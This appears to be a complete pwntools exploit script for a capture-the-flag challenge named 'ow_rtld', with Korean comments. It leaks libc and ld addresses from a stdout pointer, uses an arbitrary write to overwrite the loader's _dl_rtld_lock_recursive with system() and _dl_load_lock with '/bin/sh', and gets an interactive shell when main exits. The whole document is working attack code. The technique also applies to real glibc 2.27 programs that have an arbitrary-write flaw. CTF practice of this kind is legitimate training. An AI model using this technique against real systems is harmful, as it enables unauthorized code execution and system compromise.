#!/usr/bin/env python3
# Name: ow_rtld.py
from pwn import *

p = process('./ow_rtld', env= {"LD_PRELOAD" : "./libc-2.27.so"}) # "LD_LIBRARY_PATH" : "."
# p = remote('host3.dreamhack.games', "19843")
libc = ELF('./libc-2.27.so')
ld = ELF('./ld-2.27.so')

# gdb를 통해 획득한 정보
LIBC_BASE_OFFSET = 0x3f1000
DL_LOAD_LOCK_OFFSET_FROM_RTLD_GLOBAL = 2312
DL_RTLD_LOCK_RECURSIVE_OFFSET_FROM_RTLD_GLOBAL = 3840

p.recvuntil(b': ')
stdout = int(p.recvuntil(b'\n'), 16)  # stdout 변수의 주소 획득
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']  # libc_base 주소 획득
ld_base = libc_base + 0x3f1000  # ld_base 주소 계산
print('libc_base:', hex(libc_base))
print('ld_base:', hex(ld_base))
rtld_global = ld_base + ld.symbols['_rtld_global']  # _rtld_global 주소 획득
dl_load_lock = rtld_global + DL_LOAD_LOCK_OFFSET_FROM_RTLD_GLOBAL  # _dl_load_lock 주소 계산
dl_rtld_lock_recursive = rtld_global + DL_RTLD_LOCK_RECURSIVE_OFFSET_FROM_RTLD_GLOBAL  # _dl_rtld_lock_recursive  주소 계산
print('rtld_global:', hex(rtld_global))
print('dl_load_lock:', hex(dl_load_lock))
print('dl_rtld_lock_recursive:', hex(dl_rtld_lock_recursive))

system = libc_base + libc.symbols['system']  # system 함수의 주소 획득
print('system:', hex(system))
# _dl_rtld_lock_recursive 주소에 system 함수 덮어쓰기
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'addr: ', str(dl_rtld_lock_recursive).encode())
p.sendlineafter(b'data: ', str(system).encode())
# dl_load_lock 주소에 "/bin/sh" 문자열 덮어쓰기
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'addr: ', str(dl_load_lock).encode())
p.sendlineafter(b'data: ', str(u64('/bin/sh\x00')).encode())

# main 함수 종료
p.sendlineafter(b'> ', b'2')

p.interactive()
